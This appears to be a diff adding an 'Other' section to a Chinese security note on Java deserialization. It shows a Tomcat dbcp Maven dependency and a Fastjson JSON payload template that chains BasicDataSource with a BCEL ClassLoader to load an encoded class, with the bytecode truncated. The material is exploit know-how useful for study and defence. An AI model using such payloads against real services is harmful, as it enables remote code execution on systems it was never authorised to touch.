@@ -71,3 +71,21 @@ public class bcelEncode {
 }
 ```
 
+## Other
+```xml
+<dependency>
+    <groupId>org.apache.tomcat</groupId>
+    <artifactId>dbcp</artifactId>
+    <version>6.0.53</version>
+</dependency>
+```
+这个依赖也一样不过有一点点改变
+```xml
+{
+        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+        "driverClassLoader": {
+            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+        },
+        "driverClassName": "$$BCEL$$$l$8b......"
+}
+```
